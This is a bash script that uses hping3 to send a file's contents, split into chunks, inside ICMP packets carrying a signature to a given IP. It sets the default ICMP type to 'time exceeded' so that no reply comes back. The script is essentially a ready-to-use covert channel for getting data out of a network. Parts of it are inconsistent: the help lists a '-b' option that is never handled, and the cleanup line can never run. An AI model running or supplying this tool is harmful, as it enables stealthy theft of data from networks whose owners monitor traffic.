#!/bin/bash
#use the '-h' option to view the help (syntax) file
#Option -C 11 is ttl exceeded preventing a reply
#Usage: hping3 [dest ip] [signature] [tx file] [data frame size] [icmp type]
while getopts hc option
do
        case "${option}"
        in
                h) echo "
#-b - base64 encode file (makes the file significantly bigger, taking much longer to transmit)
#-h - this help mess
#-c - display a list of ICMP codes
#\$1 - destination IP
#\$2 - signature
#\$3 - plain text file
#\$4 - data frame size (try 100)
#\$5 - icmp type (try 11 - ttl exceeded)
#Usage: hping3 [dest ip] [signature] [tx file] [data frame size] [icmp type]
"
exit;;
                c) echo "
ICMP TYPE NUMBERS

The Internet Control Message Protocol (ICMP) has many messages that
are identified by a "type" field.

Type    Name                                    Reference
----    -------------------------               ---------
  0     Echo Reply                               [RFC792]
  1     Unassigned                                  [JBP]
  2     Unassigned                                  [JBP]
  3     Destination Unreachable                  [RFC792]
  4     Source Quench                            [RFC792]
  5     Redirect                                 [RFC792]
  6     Alternate Host Address                      [JBP]
  7     Unassigned                                  [JBP]
  8     Echo                                     [RFC792]
  9     Router Advertisement                    [RFC1256]
 10     Router Selection                        [RFC1256]
 11     Time Exceeded                            [RFC792]
 12     Parameter Problem                        [RFC792]
 13     Timestamp                                [RFC792]
 14     Timestamp Reply                          [RFC792]
 15     Information Request                      [RFC792]
 16     Information Reply                        [RFC792]
 17     Address Mask Request                     [RFC950]
 18     Address Mask Reply                       [RFC950]
 19     Reserved (for Security)                    [Solo]
 20-29  Reserved (for Robustness Experiment)        [ZSu]
 30     Traceroute                              [RFC1393]
 31     Datagram Conversion Error               [RFC1475]
 32     Mobile Host Redirect              [David Johnson]
 33     IPv6 Where-Are-You                 [Bill Simpson]
 34     IPv6 I-Am-Here                     [Bill Simpson]
 35     Mobile Registration Request        [Bill Simpson]
 36     Mobile Registration Reply          [Bill Simpson]
 37     Domain Name Request                     [Simpson]
 38     Domain Name Reply                       [Simpson]
 39     SKIP                                    [Markson]
 40     Photuris                                [Simpson]"
exit;;
esac
done
#base64 -w 0 $3 > ./.target;;
while true; do
        if hping3 $1 --icmp --sign $2 --file $3 -d $4 -u -C $5 2>&1 | grep -q --line-buffered -m 1 EOF; then
         echo "EOF Reached"
         exit
        fi
done
rm ./.target
